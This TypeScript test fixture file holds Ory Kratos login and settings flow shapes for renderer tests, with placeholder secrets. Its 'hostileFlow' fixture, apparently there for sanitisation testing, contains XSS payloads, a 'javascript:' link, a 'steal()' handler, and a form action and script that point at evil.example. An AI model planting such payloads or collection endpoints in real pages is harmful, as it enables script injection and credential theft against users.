/** Kratos flow fixtures (shapes from Ory Kratos v1.x self-service JSON) for renderer tests. */
import type { UiContainer } from './kratos-ui';

export const KRATOS = 'http://localhost:4433';

const csrf = {
  type: 'input',
  group: 'default',
  attributes: { name: 'csrf_token', type: 'hidden', value: 'csrf-123', required: true, node_type: 'input' },
  messages: [],
  meta: {},
};

export const loginFlow: UiContainer = {
  action: `${KRATOS}/self-service/login?flow=f1`,
  method: 'POST',
  messages: [{ id: 4000006, text: 'The provided credentials are invalid.', type: 'error' }],
  nodes: [
    csrf,
    {
      type: 'input',
      group: 'default',
      attributes: {
        name: 'identifier',
        type: 'text',
        value: 'me@example.com',
        required: true,
        autocomplete: 'username',
        node_type: 'input',
      },
      messages: [],
      meta: { label: { id: 1070004, text: 'Email', type: 'info' } },
    },
    {
      type: 'input',
      group: 'password',
      attributes: {
        name: 'password',
        type: 'password',
        required: true,
        autocomplete: 'current-password',
        node_type: 'input',
      },
      messages: [{ id: 4000002, text: 'Property password is missing.', type: 'error' }],
      meta: { label: { id: 1070001, text: 'Password', type: 'info' } },
    },
    {
      type: 'input',
      group: 'password',
      attributes: { name: 'method', type: 'submit', value: 'password', node_type: 'input' },
      messages: [],
      meta: { label: { id: 1010001, text: 'Sign in', type: 'info' } },
    },
    {
      type: 'input',
      group: 'passkey',
      attributes: {
        name: 'passkey_login_trigger',
        type: 'button',
        value: '',
        node_type: 'input',
        onclickTrigger: 'oryPasskeyLogin',
        onclick: 'window.oryPasskeyLogin()',
      },
      messages: [],
      meta: { label: { id: 1010021, text: 'Sign in with passkey', type: 'info' } },
    },
    {
      type: 'script',
      group: 'passkey',
      attributes: {
        src: `${KRATOS}/.well-known/ory/webauthn.js`,
        async: true,
        referrerpolicy: 'no-referrer',
        crossorigin: 'anonymous',
        integrity: 'sha512-abc',
        type: 'text/javascript',
        id: 'webauthn_script',
        nonce: 'n0nce',
        node_type: 'script',
      },
      messages: [],
      meta: {},
    },
  ],
};

export const settingsFlow: UiContainer = {
  action: `${KRATOS}/self-service/settings?flow=s1`,
  method: 'POST',
  messages: [{ id: 1050001, text: 'Your changes have been saved!', type: 'success' }],
  nodes: [
    csrf,
    {
      type: 'input',
      group: 'password',
      attributes: {
        name: 'password',
        type: 'password',
        required: true,
        autocomplete: 'new-password',
        node_type: 'input',
      },
      messages: [],
      meta: { label: { id: 1070001, text: 'Password', type: 'info' } },
    },
    {
      type: 'input',
      group: 'password',
      attributes: { name: 'method', type: 'submit', value: 'password', node_type: 'input' },
      messages: [],
      meta: { label: { id: 1050003, text: 'Save', type: 'info' } },
    },
    {
      type: 'img',
      group: 'totp',
      attributes: {
        src: 'data:image/png;base64,iVBORw0KGgo=',
        width: 256,
        height: 256,
        id: 'totp_qr',
        node_type: 'img',
      },
      messages: [],
      meta: { label: { id: 1050005, text: 'Authenticator app QR code', type: 'info' } },
    },
    {
      type: 'text',
      group: 'totp',
      attributes: {
        text: {
          id: 1050006,
          text: 'JBSWY3DPEHPK3PXP',
          type: 'info',
          context: { secret: 'JBSWY3DPEHPK3PXP' },
        },
        id: 'totp_secret_key',
        node_type: 'text',
      },
      messages: [],
      meta: { label: { id: 1050006, text: 'This is your authenticator app secret.', type: 'info' } },
    },
    {
      type: 'input',
      group: 'totp',
      attributes: { name: 'totp_code', type: 'text', required: true, node_type: 'input' },
      messages: [],
      meta: { label: { id: 1070006, text: 'Verify code', type: 'info' } },
    },
    {
      type: 'text',
      group: 'lookup_secret',
      attributes: {
        text: {
          id: 1050015,
          text: 'abcd-1234, efgh-5678',
          type: 'info',
          context: {
            secrets: [
              { text: 'abcd-1234', id: 1050009 },
              { text: 'efgh-5678', id: 1050009 },
            ],
          },
        },
        id: 'lookup_secret_codes',
        node_type: 'text',
      },
      messages: [],
      meta: { label: { id: 1050010, text: 'These are your back up recovery codes.', type: 'info' } },
    },
    {
      type: 'input',
      group: 'lookup_secret',
      attributes: { name: 'lookup_secret_confirm', type: 'submit', value: 'true', node_type: 'input' },
      messages: [],
      meta: { label: { id: 1050011, text: 'Confirm backup recovery codes', type: 'info' } },
    },
    {
      type: 'input',
      group: 'webauthn',
      attributes: {
        name: 'webauthn_register_trigger',
        type: 'button',
        value: '',
        node_type: 'input',
        onclickTrigger: 'oryWebAuthnRegistration',
      },
      messages: [],
      meta: { label: { id: 1050012, text: 'Add security key', type: 'info' } },
    },
  ],
};

/** Everything a hostile or broken flow could contain. */
export const hostileFlow: UiContainer = {
  action: 'https://evil.example/collect',
  method: 'POST',
  nodes: [
    {
      type: 'input',
      group: 'default',
      attributes: { name: 'x', type: 'text', value: '<img src=x onerror=alert(1)>', node_type: 'input' },
      messages: [],
      meta: { label: { id: 1, text: '<b>Bold</b> label', type: 'info' } },
    },
    {
      type: 'input',
      group: 'default',
      attributes: { name: 'file', type: 'file', node_type: 'input' },
      messages: [],
      meta: {},
    },
    {
      type: 'input',
      group: 'default',
      attributes: {
        name: 'go',
        type: 'submit',
        value: 'go',
        node_type: 'input',
        onclick: 'steal()',
        onclickTrigger: 'steal',
      },
      messages: [],
      meta: {},
    },
    {
      type: 'img',
      group: 'totp',
      attributes: { src: 'https://evil.example/pixel.gif', node_type: 'img' },
      messages: [],
      meta: {},
    },
    {
      type: 'a',
      group: 'default',
      attributes: { href: 'javascript:alert(1)', node_type: 'a' },
      messages: [],
      meta: {},
    },
    {
      type: 'script',
      group: 'webauthn',
      attributes: { src: 'https://evil.example/x.js', node_type: 'script', id: 'x' },
      messages: [],
      meta: {},
    },
    { type: 'iframe', group: 'default', attributes: { node_type: 'iframe' }, messages: [], meta: {} },
  ],
};
